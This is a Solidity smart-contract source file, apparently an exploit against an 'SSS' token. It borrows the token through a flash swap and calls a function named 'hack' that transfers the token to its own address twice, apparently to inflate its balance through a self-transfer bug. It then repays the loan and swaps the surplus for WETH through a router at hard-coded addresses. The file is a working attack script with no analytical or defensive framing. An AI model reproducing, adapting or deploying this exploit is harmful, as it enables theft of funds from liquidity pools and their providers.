// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0;

import "./interfaces/IERC20.sol";
import "./interfaces/IFactoryV2.sol";
import "./interfaces/IPairV2.sol";
import "./interfaces/IFlashSwapV2.sol";
import "./interfaces/ISwapRouter.sol";

contract flashSwap is IFlashSwap {
    address constant v3Factory = 0xb4A7D971D0ADea1c73198C97d7ab3f9CE4aaFA13;
    address constant SwapRouter = 0x98994a9A7a2570367554589189dC9772241650f6;
    uint256 public sellTaxPercent = 2_00; // 2%

    event log(string indexed message, uint indexed value);

    function FlashSwap(
        address token0,
        address token1,
        uint amount1
    ) external {
        address pair = Ifactory(v3Factory).getPair(token0, token1);

        require(pair != address(0), "first create the pair");

        address token0address = IPair(pair).token0();
        address token1address = IPair(pair).token1();

        uint amount0Out = token0address == token1 ? amount1 : 0;
        uint amount1Out = token1address == token1 ? amount1 : 0;

        bytes memory data = abi.encode(token1, amount1);
        IPair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function getTotalAmountOfSssTokenInPool(
        address token0,
        address token1
    ) external view returns (uint112) {
        address pair = Ifactory(v3Factory).getPair(token0, token1);
        (, uint112 reserve1, ) = IPair(pair).getReserves();
        return reserve1;
    }

    function uniswapV2Call(
        address sender,
        uint amount1,
        uint amount2,
        bytes memory data
    ) external override {
        address token0 = IPair(msg.sender).token0();
        address token1 = IPair(msg.sender).token1();

        address pair = Ifactory(v3Factory).getPair(token0, token1);

        require(msg.sender == pair, "caller must be the pair Contract");

        require(sender == address(this), "sender is this address");

        (address borrowedToken, uint amount0) = abi.decode(
            data,
            (address, uint)
        );
        hack(borrowedToken);

        uint fee = ((amount0 * 3) / 997) + 1;
        uint amountToRepay = amount0 + fee;

        IERC20(borrowedToken).transfer(pair, amountToRepay);
    }

    function hack(address SSS) internal {
        IERC20(SSS).transfer(
            address(this),
            IERC20(SSS).balanceOf(address(this))
        );
        IERC20(SSS).transfer(
            address(this),
            IERC20(SSS).balanceOf(address(this))
        );
    }

    function swappingSSStokenForWeth(
        address weth,
        address SSS_token,
        uint256 amount
    ) public {
        IERC20(SSS_token).approve(SwapRouter, amount);
        address[] memory path = new address[](2);
        path[0] = SSS_token;
        path[1] = weth;
        ISwapRouter(SwapRouter).swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
